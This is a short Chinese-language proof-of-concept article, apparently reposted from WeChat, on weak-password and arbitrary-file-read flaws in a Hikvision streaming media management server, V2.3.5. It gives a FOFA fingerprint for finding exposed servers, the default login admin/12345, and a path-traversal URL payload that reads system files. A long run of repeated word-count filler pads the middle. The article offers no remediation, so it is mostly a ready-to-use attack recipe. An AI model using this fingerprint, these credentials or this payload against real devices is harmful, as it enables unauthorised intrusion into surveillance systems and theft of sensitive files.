> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rNyBEJ_YWAiMaAoIlM9OjQ)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqshtnWHbye1V5UmBfpoywIiag41FpucRHN4Uyib4k5Ex6t393d2jNzXP2Q/640?wx_fmt=png)

**0x01 漏洞描述**  

杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞和任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。

**0x02 影响版本**

HIKVISION V2.3.5

**0x03 漏洞利用**

```
## FOFA指纹
title="流媒体管理服务器"
```

弱口令：admin - 12345  

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsgcksZddicn8X9X3icH3T1nQOkA4PuZk8oicXg3Wzeaypzql45FY4ibDk3g/640?wx_fmt=png)

< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 ><凑字数>< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >< 凑字数 >

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsQPZNYfLFvfrbj8Kg2ZXGHpmJBia8K2icC8b0xSzibVJOXMVJgpQN8ZUYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsUfl9XCjHwVfyXFKQ842wujPvSyeBgkhicGll56Kul8rbIaXpZ568LwQ/640?wx_fmt=png)

```
## Payload
/systemLog/downFile.php?fileName=../../../../../../../windows/system32/drivers/etc/hosts
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/ccX15AUPS2yPwE2XnAZmP79zz03JiaibqsxhhXPo4tFc0icEG5icspCge1E8bTic3xkO4IuPvbWyCQbBIyKm23PBbRw/640?wx_fmt=jpeg)